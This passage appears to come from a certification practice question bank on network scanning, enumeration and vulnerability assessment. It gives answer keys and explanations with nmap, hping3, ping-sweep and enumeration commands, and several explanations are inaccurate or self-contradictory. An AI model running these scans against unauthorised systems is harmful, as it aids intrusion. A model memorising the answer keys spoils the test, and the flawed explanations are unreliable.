> + **TCP/IP**, or the Transmission Control Protocol/Internet Protocol, is a suite of communication protocols used to interconnect network devices on the internet. TCP/IP can also be used as a communications protocol in a private network (an intranet or an extranet).

126. Which of the following tools are useful in extracting information about the geographical location of routers, servers and IP devices in a network?
+ [ ] Email Tracking Tools
+ [ ] WhoIs Lookup tools
+ [x] Traceroute tools
+ [ ] DNS Lookup tools
> **Explanation:**
> + Traceroute tools are useful in extracting information about the geographical location of routers, servers and IP devices in a network. Such tools help us to trace, identify, and monitor the network activity on a world map.
> 
> Some of the features of these tools include:
> + Hop-by-hop traceroutes
> + Reverse tracing
> + Historical analysis
> + Packet loss reporting
> + Reverse DNS
> + Ping plotting
> + Port probing
> + Detect network problems
> + Performance metrics analysis
> + Network performance monitoring

# 03. Scanning Networks
## Overview of Network Scanning
127. An attacker is using the scanning tool Hping to scan and identify live hosts, open ports, and services running on a target network. He/she wants to collect all the TCP sequence numbers generated by the target host.  
Which of the following Hping commands he/she needs to use to gather the required information?
+ [x] hping3 <Target IP> -Q -p 139 -s
+ [ ] hping3 –A <Target IP> –p 80
+ [ ] hping3 –F –P –U 10.0.0.25 –p 80
+ [ ] hping3 -S <Target IP> -p 80 --tcp-timestamp
> **Explanation:**
> + **hping3 <Target IP> -Q -p 139 -s:** By using the argument -Q in the command line, Hping collects all the TCP sequence numbers generated by the target host.
> + **hping3 –A <Target IP> –p 80:** By issuing this command, Hping checks if a host is alive on a network. If it finds a live host and an open port, it returns an RST response.
> + **hping3 -S <Target IP> -p 80 --tcp-timestamp:** By adding the --tcp-timestamp argument in the command line, Hping enable TCP timestamp option and try to guess the timestamp update frequency and uptime of the target host.
> + **hping3 –F –P –U 10.0.0.25 –p 80:** By issuing this command, an attacker can perform FIN, PUSH, and URG scans on port 80 on the target host.

128. A technician is resolving an issue where a computer is unable to connect to the Internet using a wireless access point. The computer can transfer files locally to other machines, but cannot successfully reach the Internet. When the technician examines the IP address and default gateway, they are both on the 192.168.1.0/24. Which of the following has occurred?  
+ [ ] The gateway and the computer are not on the same network.
+ [ ] The computer is not using a private IP address.
+ [x] The gateway is not routing to a public IP address.
+ [ ] The computer is using an invalid IP address.
> **Explanation:**
> + If the gateway is not routing to a public IP address, then there is no way of getting to the Internet. A default gateway is an IP router that is used to send information to a computer in another network. Computers can send data to another network through the default gateway.

129. Which of the following network attacks relies on sending an abnormally large packet size that exceeds TCP/IP specifications?
+ [ ] SYN flooding
+ [ ] Smurf attack
+ [x] Ping of death
+ [ ] TCP hijacking
> **Explanation:**
> + **Ping of death:** In a ping of death (PoD) attack, an attacker tries to crash, destabilize, or freeze the target system or service by sending malformed or oversized packets using simple ping command. For instance, the attacker sends a packet that has a size of 65,538 bytes to the target webserver. This size of the packet exceeds the size limit prescribed by RFC 791 IP, which is 65,535 bytes.
> + **SYN flooding:** In an SYN attack, the attacker sends a large number of SYN requests to the target server (victim) with fake source IP addresses. The attack creates incomplete TCP connections that use up network resources.
> + **TCP hijacking:** TCP session hijacking allows attackers to take over an active session by bypassing the authentication process.
> + **Smurf attack:** In a Smurf attack, the attacker spoofs the source IP address with the victim’s IP address and sends a large number of ICMP ECHO request packets to an IP broadcast network. It makes all the hosts on the broadcast network to respond to the received ICMP ECHO requests.

130. Which of the following is a routing protocol that allows the host to discover the IP addresses of active routers on their subnet by listening to router advertisement and soliciting messages on their network?
+ [ ] ARP
+ [x] IRDP
+ [ ] DHCP
+ [ ] DNS
> **Explanation:**
> + The **ICMP Router Discovery Protocol (IRDP)** is a routing protocol that allows a host to discover the IP addresses of active routers on its subnet by listening to router advertisement and solicitation messages on its network. The attacker can add default route entries on a system remotely by spoofing router advertisement messages. Since IRDP does not require any authentication, the target host will prefer the default route defined by the attacker to the default route provided by the DHCP server. The attacker accomplishes this by setting the preference level and the lifetime of the route at high values to ensure that the target hosts will choose it as the preferred route.
> 
> + **Address Resolution Protocol (ARP)** is a stateless TCP/IP protocol that maps IP network addresses to the addresses (hardware addresses) used by a data link protocol. Using this protocol, a user can easily obtain the MAC address of any device on a network.
> 
> + **Dynamic Host Configuration Protocol (DHCP)** is a client/server protocol that provides an IP address to an IP host. In addition to the IP address, the DHCP server also provides configuration related information such as the default gateway and subnet mask. When a DHCP client device boots up, it participates in traffic broadcasting.
> 
> + **DNS** is the protocol that translates a domain name (e.g., www.eccouncil.org) into an IP address (e.g., 208.66.172.56). The protocol uses DNS tables that contain the domain name and its equivalent IP address stored in a distributed large database.

131. Which of the following hping command performs UDP scan on port 80?
+ [ ] hping3 –F –P –U <IP Address> –p 80
+ [ ] hping3 -1 <IP Address> –p 80
+ [ ] hping3 –A <IP Address> –p 80
+ [x] hping3 -2 <IP Address> –p 80
> **Explanation:**
> Hping2/Hping3 is a command-line-oriented network scanning and packet crafting tool for the TCP/IP protocol that sends ICMP echo requests and supports TCP, UDP, ICMP, and raw-IP protocols.
> Below are various Hping commands:
> + ICMP Ping: hping3 -1 <IP Address> –p 80
> + ACK scan on port 80: hping3 –A <IP Address> –p 80
> + UDP scan on port 80: hping3 -2 <IP Address> –p 80
> 
> Hping uses TCP as its default protocol. Using the argument -2 in the command line specifies that Hping operates in UDP mode. You may use either --udp of -2 arguments in the command line.
> + SYN scan on port 50-60: hping3 -8 50-60 –S <IP Address> -V
> + FIN, PUSH and URG scan on port 80: hping3 –F –P –U <IP Address> –p 80
> + Scan entire subnet for live host: hping3 -1 10.0.1.x --rand-dest –I eth0
> + Intercept all traffic containing HTTP signature: hping3 -9 HTTP –I eth0

132. What type of OS fingerprinting technique sends specially crafted packets to the remote OS and analyzes the received response?
+ [ ] Reflective
+ [x] Active
+ [ ] Passive
+ [ ] Distributive
> **Explanation:**
> In active OS fingerprinting, specially crafted packets are sent to remote OS and the responses are noted. The responses are then compared with a database to determine the OS. Response from different OSes varies due to differences in TCP/IP stack implementation.

133. Which of the following scanning tools is specifically designed to find potential exploits in Microsoft Windows products?
+ [x] Microsoft Baseline Security Analyzer
+ [ ] Core Impact
+ [ ] Retina
+ [ ] Microsoft Security Baseline Analyzer
> **Explanation:**
> Microsoft baseline security analyzer (MBSA) allows administrators to scan local and remote systems for missing security updates as well as common security misconfigurations in Microsoft Windows products.

134. A hacker is attempting to see which protocols are supported by target machines or network. Which NMAP switch would the hacker use?
+ [ ] -sP
+ [ ] -sS
+ [ ] -sU
+ [x] -sO
> **Explanation:**
> + **-sO (IP protocol scan)** IP protocol scan allows you to determine which IP protocols (TCP, ICMP, IGMP, etc.) are supported by target machines. This isn't technically a port scan, since it cycles through IP protocol numbers rather than TCP or UDP port numbers.
> + **-sT (TCP connect scan)** TCP connect scan is the default TCP scan type when SYN scan is not an option. This is the case when a user does not have raw packet privileges. Instead of writing raw packets as most other scan types do, Nmap asks the underlying operating system to establish a connection with the target machine and port by issuing the connect system call.
> + **-sS (TCP SYN scan)** SYN scan is the default scan option used for scanning thousands of ports per second on a fast network not hampered by restrictive firewalls.
> + **-sU (UDP scans)** UDP scan works by sending a UDP packet to every targeted port.

135. If a tester is attempting to ping a target that exists but receives no response or a response that states the destination is unreachable, ICMP may be disabled and the network may be using TCP. Which other option could the tester use to get a response from a host using TCP?
+ [ ] TCP ping
+ [ ] Traceroute
+ [x] Hping
+ [ ] Broadcast ping
> **Explanation:**
> + Hping2/Hping3 is a command-line-oriented network scanning and packet crafting tool for the TCP/IP protocol that sends ICMP echo requests and supports TCP, UDP, ICMP, and raw-IP protocols. It performs network security auditing, firewall testing, manual path MTU discovery, advanced traceroute, remote OS fingerprinting, remote uptime guessing, TCP/IP stacks auditing, and other functions.
> + In the above scenario, host does not respond to a ping request. Here, tester need to use Hping tools and perform ACK scan to get the response from a host using TCP.
> + Hping can be configured to perform an ACK scan by specifying the argument -A in the command line. Here, you are setting ACK flag in the probe packets and performing the scan. You perform this scan when a host does not respond to a ping request. By issuing this command, Hping checks if a host is alive on a network. If it finds a live host and an open port, it returns an RST response.

136. A penetration tester is attempting to scan an internal corporate network from the Internet without alerting the border sensor. Which of the following techniques should the tester consider using?
+ [ ] Spoofing an IP address
+ [x] Tunneling scan over SSH
+ [ ] Tunneling over high port numbers
+ [ ] Scanning using fragmented IP packets
> **Explanation:**
> + Option “Tunneling scan over SSH” is correct.
> + SSH protocol tunneling involves sending unencrypted network traffic through an SSH tunnel. For example, suppose you want to transfer files on an unencrypted FTP protocol, but the FTP protocol is blocked on the target firewall. The unencrypted data can be sent over encrypted SSH protocol using SSH tunneling. Pen tester makes use of this technique to bypass border sensors (e.g., firewall, IDS).

137. An NMAP scan of a server shows port 25 is open. What risk could this pose?
+ [ ] Clear text authentication
+ [ ] Web portal data leak
+ [ ] Open printer sharing
+ [x] Active mail relay
> **Explanation:**
> Active mail relay is an SMTP server configured in such a way that it allows anyone on the Internet to send email through it, not just mail destined to or originating from known users. Simple Mail Transfer Protocol (SMTP) uses port 25 for email routing between mail servers. In the above scenario, Nmap scan shows port 25 is open; it is vulnerable to active mail relay.

138. Which of the following resources does NMAP need to be used as a basic vulnerability scanner covering several vectors like SMB, HTTP and FTP?  
+ [ ] Metasploit scripting engine
+ [x] NMAP scripting engine
+ [ ] SAINT scripting engine
+ [ ] Nessus scripting engine
> **Explanation:**
> Nmap scripting engine (NSE) provides scripts that reveal all sorts of useful information from the target web server.
> 
> NSE is used in the following tasks:
> + Network discovery
> + More sophisticated version detection
> + Vulnerability detection
> + Backdoor detection
> + Vulnerability exploitation

139. Which of the following is NOT an objectives of network scanning?
+ [ ] Discover the network’s live hosts
+ [ ] Discover the services running
+ [x] Discover usernames and passwords
+ [ ] Discover the services running
> **Explanation:**
> The more the information at hand about a target organization, the greater the chances of knowing a network’s security loopholes and consequently, for gaining unauthorized access to it. Below are some objectives for scanning a network: 
> + Discover the network’s live hosts, IP addresses, and open ports of live. Using open ports, the attacker will determine the best means of entry into the system.
> + Discover the operating system and system architecture of the target. This is also known as fingerprinting. An attacker can formulate an attack strategy based on the operating system’s vulnerabilities.
> + Discover the services running/listening on the target system. Doing so gives the attacker an indication of vulnerabilities (based on the service) exploitation for gaining access to the target system.
> + Identify specific applications or versions of a particular service.
> + Identify vulnerabilities in any of the network systems. This helps an attacker to compromise the target system or network through various exploits. 


## Scanning Techniques
140. A penetration tester is conducting a port scan on a specific host. The tester found several open ports that were confusing in concluding the operating system (OS) version installed. Considering the NMAP result below, which of the following is likely to be installed on the target machine by the OS?
```
Starting NMAP 7.70 at 2018-03-15 11:06
NMAP scan report for 172.16.40.65
Host is up (1.00s latency).
Not shown: 993 closed ports

PORT     STATE SERVICE
21/tcp   open  ftp
23/tcp   open  telnet
80/tcp   open  http
139/tcp  open  netbios-ssn
515/tcp  open
631/tcp  open  ipp
9100/tcp open

MAC Address: 00:00:48:0D:EE:89
```
+ [ ] The host is likely a Linux machine.
+ [x] The host is likely a printer.
+ [ ] The host is likely a Windows machine.
+ [ ] The host is likely a router.
> **Explanation:**
> + The protocols TCP and UDP uses port 515 to interact with the printer. As port 515 is open in the above Nmap output, probably the host is a printer.?

141. Which of the following parameters enables NMAP's operating system detection feature?
+ [x] NMAP -O
+ [ ] NMAP -oS
+ [ ] NMAP -sV
+ [ ] NMAP -sC
> **Explanation:**
> Banner grabbing, or "OS fingerprinting," is a method used to determine the operating system that is running on a remote target system.
> 
> OS detection is enabled and controlled by Nmap with the following options:
> + -O (Enable OS detection)
> + --osscan-limit (Limit OS detection to promising targets)
> + --osscan-guess; --fuzzy (Guess OS detection results)
> + --max-os-tries (Set the maximum number of OS detection tries against a target)
> 
> Hence, NMAP -O is the correct option.

142. Which of the following open source tools would be the best choice to scan a network for potential targets?
+ [ ] John the Ripper
+ [x] NMAP
+ [ ] hashcat
+ [ ] Cain & Abel
> **Explanation:**
> + Nmap is an open-source security scanner for network exploration and hacking. It allows you to discover hosts and services on a computer network, thus creating a "map" of the network.
> 
> + hashcat, Cain & Abel, and John the Ripper are the password cracking tools that allow you to reset unknown or lost Windows local administrator, domain administrator, and other user account passwords. In the case of forgotten passwords, it even allows users to get access to their locked computer instantly without reinstalling Windows.

143. A hacker is attempting to see which IP addresses are currently active on a network. Which NMAP switch would the hacker use?
+ [x] -sn
+ [ ] -sS
+ [ ] -sU
+ [ ] -sT
> **Explanation:**
> + -sn (No port scan): This option tells Nmap not to do a port scan after host discovery and only print out the available hosts that responded to the host discovery probes. This is often called a ping sweep.
> 
> + Here, the hacker is attempting ping sweep to check live systems. So he needs to use the -sP option.

144. Which NMAP feature can a tester implement or adjust while scanning for open ports to avoid detection by the network’s IDS?
+ [ ] Traceroute to control the path of the packets sent during the scan.
+ [x] Timing options to slow the speed that the port scan is conducted.
+ [ ] ICMP ping sweep to determine which hosts on the network are not available .
+ [ ] Fingerprinting to identify which operating systems are running on the network.
> **Explanation:**
> The tester needs to implement timing options in Nmap which allows the tester to set the given amount of time between each probe it sends to a given host. Timing option is used to evade threshold-based intrusion detection and prevention systems (IDS/IPS).
> 
> Some of the timing options are as follows:
> + --delay <time> (Delay between probes)
> + --rate <rate> (Send probes at a given rate)
> + -d <time>, --delay <time> (Specify line delay)
> + -i <time>, --idle-timeout <time> (Specify idle timeout)
> + -w <time>, --wait <time> (Specify connect timeout)

145. You are performing a port scan with Nmap. You are in hurry and conducting the scans at the fastest possible speed. However, you don’t want to sacrifice reliability for speed. If stealth is not an issue, what type of scan should you run to get very reliable results?  
+ [ ] Stealth scan
+ [x] Connect scan
+ [ ] Fragmented packet scan
+ [ ] XMAS scan
> **Explanation:**
> + TCP Connect/Full Open Scan is one of the most reliable forms of TCP scanning. In TCP Connect scanning, the operating system’s TCP connect() system call tries to open a connection to every interesting port on the target machine. This is the fastest scanning method supported by Nmap.
> 
> + Making a separate connect() call for every targeted port in a linear fashion would take a long time over a slow connection. You can accelerate the scan by using many sockets in parallel. Using non-blocking, I/O allows you to set a low time-out period and watch all the sockets simultaneously.
> 
> + In the above scenario, user needs a reliable result in less time. User needs to run connect scan to get the desired result.

146. Which NMAP command combination would let a tester scan every TCP port from a class C network that is blocking ICMP with fingerprinting and service detection?
+ [ ] NMAP -PN -O -sS -p 1-1024 192.168.0/8
+ [x] NMAP -PN -A -O -sS 192.168.2.0/24
+ [ ] NMAP -P0 -A -sT -p0-65535 192.168.0/16
+ [ ] NMAP -P0 -A -O -p1-65535 192.168.0/24
> **Explanation:**
> + -Pn (also known as No ping) Assume the host is up, thus skipping the host discovery phase, whereas P0 (IP Protocol Ping) sends IP packets with the specified protocol number set in their IP header.
> 
> + -A This options makes Nmap make an effort in identifying the target OS, services, and the versions. It also does traceroute and applies NSE scripts to detect additional information.
> 
> + The -O option turns on Nmap’s OS fingerprinting system. Used alongside the -v verbosity options, you can gain information about the remote operating system and about its TCP sequence number generation (useful for planning idle scans).
> 
> + -sS Perform a TCP SYN connect scan. This just means that Nmap will send a TCP SYN packet just like any normal application would do. If the port is open, the application must reply with SYN/ACK; however, to prevent half-open connections Nmap will send an RST to tear down the connection again.
> 
> + -sT is an Nmap TCP connect scan and it is the default TCP scan type when SYN scan is not an option. Since, Class C network starts its IP address from 192.0.0.0.
> 
> + So, “NMAP -PN -A -O -sS 192.168.2.0/24” is the correct answer.

147. A company has five different subnets: 192.168.1.0, 192.168.2.0, 192.168.3.0, 192.168.4.0 and 192.168.5.0. How can NMAP be used to scan these adjacent Class C networks?
+ [ ] NMAP -P 192.168.1.0,2.0,3.0,4.0,5.0
+ [x] NMAP -P 192.168.1-5.
+ [ ] NMAP -P 192.168.1/17
+ [ ] NMAP -P 192.168.0.0/16
> **Explanation:**
> 192.168.1-5 represents the five different subnets: 192.168.1.0, 192.168.2.0, 192.168.3.0, 192.168.4.0, and 192.168.5.0

148. Which of the following Hping3 command is used to perform ACK scan?
+ [ ] hping3 -1 <IP Address> –p 80
+ [ ] hping3 -2 <IP Address> –p 80
+ [x] hping3 –A <IP Address> –p 80
+ [ ] hping3 -8 50-60 –S <IP Address> –V
> **Explanation:**
> + hping3 -1 <IP Address> –p 80 : ICMP ping
> + hping3 –A <IP Address> –p 80 : ACK scan on port 80
> + hping3 -2 <IP Address> –p 80 : UDP scan on port 80
> + hping3 -8 50-60 –S <IP Address> –V : SYN scan on port 50-60

149. What results will the following command yield?
`nmap -sS -O -p 123-153 192.168.100.3`
+ [ ] A stealth scan, checking all open ports excluding ports 123 to 153.
+ [ ] A stealth scan, opening port 123 and 153.
+ [ ] A stealth scan, checking open ports 123 to 153.
+ [x] A stealth scan, determine operating system, and scanning ports 123 to 153.
> **Explanation:**
> In the above query,
> + -sS specifies stealth scan, -O attempts to perform OS fingerprinting to identify the operating system, and -p specifies port range to scan. Hence, “A stealth scan, determine operating system, and scanning ports 123 to 153” is the correct answer.

150. A security engineer is attempting to perform scanning on a company’s internal network to verify security policies of their networks. The engineer uses the following NMAP command: `nmap –n –sS –P0 –p 80 ***.***.**.**` What type of scan is this?
+ [ ] Comprehensive scan
+ [ ] Intense scan
+ [x] Stealth scan
+ [ ] Quick scan
> **Explanation:**
> Nmap scanning techniques:
> + -sS (TCP SYN/Stealth scan)
> + -sT (TCP connect scan)
> + -sU (UDP scans)
> + -sY (SCTP INIT scan)
> + -sN; -sF; -sX (TCP NULL, FIN, and Xmas scans)
> + -sA (TCP ACK scan)
> + -sW (TCP Window scan)
> 
> In the above scenario, the security engineer uses -sS option to perform the scan. This means he is performing stealth scan.

# 04. Enumeration
## Overview of Network Scanning
151. Which command lets a tester enumerate live systems in a class C network via ICMP using native Windows tools?
+ [ ] ping 192.168.2.255
+ [ ] for %V in (1 1 255) do PING 192.168.2.%V
+ [x] for /L %V in (1 1 254) do PING -n 1 192.168.2.%V | FIND /I "Reply"
+ [ ] ping 192.168.2.
> **Explanation:**
> + The command below will ping all IP addresses on the 192.168.2.0 network and help the tester to determine live systems in the network along with replies.
> + for /L %V in (1 1 254) do PING -n 1 192.168.2.%V | FIND /I "Reply"
> + Ping 192.168.2. and ping 192.168.2.255 will just ping the target IPs
> + for %V in (1 1 255) do PING 192.168.2.%V command does not consist of reply from the host machines

152. Which of the following command is used by the attackers to query the ntpd daemon about its current state?
+ [ ] ntptrace
+ [ ] ntpq
+ [ ] ntpdate
+ [x] ntpdc
> **Explanation:**
> + **ntpdate:** This command collects the number of time samples from a number of time sources
> + **ntptrace:** This command determines from where the NTP server gets time and follows the chain of NTP servers back to its prime time source
> + **ntpdc:** This command queries the ntpd daemon about its current state and requests changes in that state
> + **ntpq:** This command monitors NTP daemon ntpd operations and determine performance

153. At a Windows server command prompt, which command could be used to list the running services?
+ [ ] Sc query type= running
+ [x] Sc query
+ [ ] Sc config
+ [ ] Sc query \\servername
> **Explanation:**
> **sc query:** Obtains and displays information about the specified service, driver, type of service, or type of driver.

154. Which of the following information is collected using enumeration?
+ [x] Network resources, network shares, and machine names.
+ [ ] Email Recipient's system IP address and geolocation.
+ [ ] Operating systems, location of web servers, users and passwords.
+ [ ] Open ports and services.
> **Explanation:**
> Enumeration is the process of extracting user names, machine names, network resources, shares, and services from a system or network.
> 
> Enumeration allows you to collect following information:
> + Network resources
> + Network shares
> + Routing tables
> + Audit and service settings
> + SNMP and FQDN details
> + Machine names
> + Users and groups
> + Applications and banners

155. Which of the following enumeration techniques is used by a network administrator to replicate domain name system (DNS) data across many DNS servers, or to backup DNS files?
+ [ ] Extract information using default passwords
+ [ ] Extract user names using email IDs
+ [ ] Brute force Active Directory
+ [x] Extract information using DNS Zone Transfer
> **Explanation:**
> Extract information using DNS zone transfer: a network administrator can use DNS zone transfer to replicate DNS data across many DNS servers or to backup DNS files. The administrator needs to execute a specific zone transfer request to the name server.

156. What is the port number used by DNS servers to perform DNS zone transfer?
+ [ ] UDP 137
+ [x] TCP/UDP 53
+ [ ] TCP/UDP 135
+ [ ] TCP 139
> **Explanation:**
> + TCP/UDP 135: Microsoft RPC Endpoint Mapper listens on TCP/IP port 135.
> + UDP 137: NetBIOS Name Service (NBNS) uses UDP 137 as its transport protocol.
> + TCP 139: NetBIOS Session Service (SMB over NetBIOS) uses TCP 139 as its transport protocol.
> + TCP/UDP 53: DNS Zone Transfer - DNS clients send DNS messages to DNS servers listening on UDP port 53.

157. Which of the following protocols uses TCP or UDP as its transport protocol over port 389?
+ [ ] SNMP
+ [ ] SMTP
+ [x] LDAP
+ [ ] SIP
> **Explanation:**
> LDAP is a protocol for accessing and maintaining distributed directory information services over an Internet protocol (IP) network. By default, LDAP uses TCP or UDP as its transport protocol over port 389.
> 
> Simple network management protocol (SNMP) is widely used in network management systems to monitor network-attached devices such as routers, switches, firewalls, printers, servers, and so on. It consists of a manager and agents. The agent receives requests on Port 161 from the managers and responds to the managers on Port 162.
> 
> SMTP is a TCP/IP mail delivery protocol. It transfers e-mail across the Internet and the local network. It runs on the connection-oriented service provided by transmission control protocol (TCP), and it uses the well-known port number 25.
> 
> Session initiation protocol (SIP) is used in the applications of Internet telephony for voice and video calls. It typically uses TCP/UDP port 5060 (nonencrypted signaling traffic) or 5061 (encrypted traffic with TLS) for SIP to servers and other endpoints.

158. Which of the following steps in enumeration penetration testing serves as an input to many of the ping sweep and port scanning tools for further enumeration?
+ [ ] Perform email footprinting
+ [ ] Perform ARP poisoning
+ [x] Calculate the subnet mask
+ [ ] Perform competitive intelligence
> **Explanation:**
> Calculate the subnet mask. This mask is required for IP range using tools such as Subnet Mask Calculator. The calculated subnet mask can serve as an input to many of the ping sweep and port scanning tools for further enumeration, which includes discovering hosts and open ports.

159. Which of the following steps in enumeration penetration testing extracts information about encryption and hashing algorithms, authentication type, key distribution algorithms, SA LifeDuration, etc.?
+ [x] Perform IPsec enumeration
+ [ ] Perform NTP enumeration
+ [ ] Perform DNS enumeration
+ [ ] Perform SMTP enumeration
> **Explanation:**
> IPsec provides data security by employing various components like ESP (Encapsulation Security Payload), AH (Authentication Header), and IKE (Internet Key Exchange) to secure communication between VPN end-points. Attacker can perform a simple direct scanning for ISAKMP at UDP port 500 with tools like Nmap, etc. to acquire the information related to the presence of a VPN gateway.
> 
> You can enter the following command to perform Nmap scan for checking the status of isakmp over port 500: 
> + `nmap –sU –p 500 <target IP address>`
> 
> Attackers can probe further using fingerprinting tools such as ike-scan to enumerate the sensitive information including encryption and hashing algorithm, authentication type, key distribution algorithm, SA LifeDuration, etc. In this type of scan, specially crafted IKE packets with ISAKMP header are sent to the target gateway and the responses are recorded.

160. Which of the following protocols provides reliable multiprocess communication service in a multinetwork environment?
+ [ ] SMTP
+ [ ] UDP
+ [x] TCP
+ [ ] SNMP
> **Explanation:**
> Transmission control protocol (TCP) is a connection-oriented protocol. It is capable of carrying messages or e-mail over the Internet. It provides reliable multiprocess communication service in a multinetwork environment.
> 
> UDP is a connectionless protocol, which provides unreliable service. It carries short messages over a computer network.
> 
> SMTP is a TCP/IP mail delivery protocol. It transfers e-mail across the Internet and the local network. It runs on connection-oriented service provided by TCP.
> 
> Simple network management protocol (SNMP) is widely used in network management systems to monitor network-attached devices such as routers, switches, firewalls, printers, servers, and so on.


## Enumeration Techniques
161. An attacker identified that port 139 on the victim’s Windows machine is open and he used that port to identify the resources that can be accessed or viewed on the remote system. What is the protocol that allowed the attacker to perform this enumeration?
+ [ ] LDAP
+ [ ] SMTP
+ [ ] SNMP
+ [x] NetBIOS
> **Explanation:**
> An attacker who finds a Windows OS with port 139 open can check to see what resources can be accessed or viewed on the remote system. However, to enumerate the NetBIOS names, the remote system must have enabled file and printer sharing.

162. Which of the following windows utilities allow an attacker to perform NetBIOS enumeration?
+ [ ] ntpdate
+ [ ] SetRequest
+ [ ] GetRequest
+ [x] nbtstat
> **Explanation:**
> The nbtstat utility in Windows displays NetBIOS over TCP/IP (NetBT) protocol statistics, NetBIOS names tables for both the local and remote computers, and the NetBIOS name cache. An attacker can run the nbtstat command, `nbtstat.exe –c` to get the contents of the NetBIOS name cache, the table of NetBIOS names, and their resolved IP addresses. An attacker can also run the nbtstat command, `nbtstat.exe –a <IP address of the remote machine>` to get the NetBIOS name table of a remote computer.

163. Which of the following tools is not a NetBIOS enumeration tool?
+ [ ] Hyena
+ [ ] SuperScan
+ [x] OpUtils
+ [ ] NetScanTools Pro
> **Explanation:**
> Among the given options, Hyena, SuperScan, and NetScanTools Pro can be used to perform NetBIOS enumeration, whereas OpUtils is an SNMP enumeration tool.

164. Which protocol enables an attacker to enumerate user accounts and devices on a target system?
+ [x] SNMP
+ [ ] TCP
+ [ ] SMTP
+ [ ] NetBIOS
> **Explanation:**
> SNMP (Simple Network Management Protocol) is an application layer protocol that runs on UDP and maintains and manages routers, hubs, and switches on an IP network. SNMP agents run on Windows and UNIX networks on networking devices.
> 
> SNMP holds two passwords to access and configure the SNMP agent from the management station:
> + Read community string: It is public by default; allows viewing of device/system configuration
> + Read/write community string: It is private by default; allows remote editing of configuration
> 
> Attacker uses these default community strings to extract information about a device Attackers enumerate SNMP to extract information about network resources such as hosts, routers, devices, shares, etc. and network information such as ARP tables, routing tables, traffic, etc.

165. Which of the following tools can be used to perform SNMP enumeration?
+ [ ] SoftPerfect Network Scanner
+ [ ] Nsauditor Network Security Auditor
+ [ ] SuperScan
+ [x] SNScan
> **Explanation:**
> SNScan is the only tool among the given options that can perform SNMP enumeration. SoftPerfect network scanner, SuperScan, and Nsauditor network security auditor are tools used to perform NetBIOS enumeration.

166. Which of the following protocols is responsible for accessing distributed directories and access information such as valid usernames, addresses, departmental details, and so on?
+ [ ] NTP
+ [ ] DNS
+ [x] LDAP
+ [ ] SMTP
> **Explanation:**
> Lightweight directory access protocol (LDAP) is an Internet protocol for accessing distributed directory services. Directory services may provide any organized set of records such as corporate e-mail directory, often in a hierarchical and logical structure. An attacker queries LDAP service to gather information such as valid user names, addresses, departmental details, and so on that can be further used to perform attacks.

167. Which of the following tools can be used to perform LDAP enumeration?
+ [ ] SoftPerfect Network Scanner
+ [ ] SuperScan
+ [x] JXplorer
+ [ ] Nsauditor Network Security Auditor
> **Explanation:**
> Among the given options, JXplorer can be used to perform LDAP enumeration, whereas SoftPerfect network scanner, SuperScan, and Nsauditor network security auditor are tools that are used to perform NetBIOS enumeration.

168. Which of the following protocols is responsible for synchronizing clocks of networked computers?
+ [ ] LDAP
+ [ ] SMTP
+ [ ] DNS
+ [x] NTP
> **Explanation:**
> Network time protocol (NTP) is designed to synchronize clocks of networked computers. NTP can maintain time to within 10 milliseconds (1/100 seconds) over the public Internet. It can achieve accuracies of 200 microseconds or better in local area networks under ideal conditions.

169. Which of the following SMTP in-built commands tells the actual delivery addresses of aliases and mailing lists?
+ [ ] RCPT TO
+ [ ] PSINFO
+ [x] EXPN
+ [ ] VRFY
> **Explanation:**
> Mail systems commonly use SMTP with POP3 and IMAP that enables users to save the messages in the server mailbox and download them occasionally from the server. SMTP uses Mail Exchange (MX) servers to direct the mail via DNS. It runs on TCP port 25.
> 
> SMTP provides 3 built-in-commands:
> + VRFY - Validates users
> + EXPN - Tells the actual delivery addresses of aliases and mailing lists
> + RCPT TO - Defines the recipients of the message
> 
> SMTP servers respond differently to VRFY, EXPN, and RCPT TO commands for valid and invalid users from which we can determine valid users on SMTP server. Attackers can directly interact with SMTP via the telnet prompt and collect list of valid users on the SMTP server.

170. Which of the following protocols is the technology for both gateway-to-gateway (LAN-to-LAN) and host to gateway (remote access) enterprise VPN solutions?
+ [ ] NetBios
+ [ ] SNMP
+ [ ] SMTP
+ [x] IPSec
> **Explanation:**
> IPsec is the most commonly implemented technology for both gateway-to-gateway (LAN-to-LAN) and host-to-gateway (remote access) enterprise VPN solutions. IPsec provides data security by employing various components such as ESP (encapsulation security payload), AH (authentication header), and IKE (Internet key exchange) to secure communication between VPN end-points. Most Ipsec-based VPNs use ISAKMP (Internet security association key management protocol), a part of IKE, to establish, negotiate, modify, and delete security associations (SA) and cryptographic keys in a VPN environment. An attacker can perform simple direct scanning for ISAKMP at UDP port 500 with tools, such as Nmap, to acquire the information related to the presence of a VPN gateway.

# 05. Vulnerability Analysis
## Vulnerability Assessment Concepts
171. An NMAP scan of a server shows port 69 is open. What risk could this pose?
+ [ ] Cleartext login
+ [ ] Weak SSL version
+ [x] Unauthenticated access
+ [ ] Web portal data leak
> **Explanation:**
> Trivial File Transfer Protocol (TFTP) is a File Transfer Protocol that allows a client to get a file from or put a file onto a remote host. This protocol includes no login or access control mechanisms, and therefore it is recommended to take care when using this protocol for file transfers where authentication, access control, confidentiality, or integrity checking are needed. Otherwise, it may result in unauthorized access to remote host.

172. Which of the following techniques helps the attacker in identifying the OS used on the target host in order to detect vulnerabilities on a target system?
+ [ ] IP address decoy
+ [x] Banner grabbing
+ [ ] Port scanning
+ [ ] Source routing
> **Explanation:**
> + Port scanning: Port scanning is the process of checking the services running on the target computer by sending a sequence of messages in an attempt to break in.
> + Banner grabbing: Banner grabbing or OS fingerprinting is the method used to determine the operating system running on a remote target system. Identifying the OS used on the target host allows an attacker to figure out the vulnerabilities the system posses and the exploits that might work on a system to further carry out additional attacks.
> + Source Routing: Source routing refers to sending a packet to the intended destination with partially or completely specified route (without firewall-/IDS-configured routers) in order to evade IDS/firewall.
> + IP address decoy: IP address decoy technique refers to generating or manually specifying IP addresses of the decoys in order to evade IDS/firewall.

173. Which of the following business challenges could be solved by using a vulnerability scanner?
+ [ ] Auditors want to discover if all systems are following a standard naming convention.
+ [ ] A web server was compromised and management needs to know if any further systems were compromised.
+ [ ] There is an urgent need to remove administrator access from multiple machines for an employee who quit.
+ [x] There is a monthly requirement to test corporate compliance with host application usage and security policies.
> **Explanation:**
> Vulnerability scanners help in analyzing and identifying vulnerabilities in the target network or network resources by means of vulnerability assessment and network auditing. These tools also assist in overcoming weaknesses in the network by suggesting various remediation techniques. Vulnerability scanners are used to test corporate compliance with host application usage and security policies. Any deviation from a standard or baseline security configuration is marked as a vulnerability.
> 
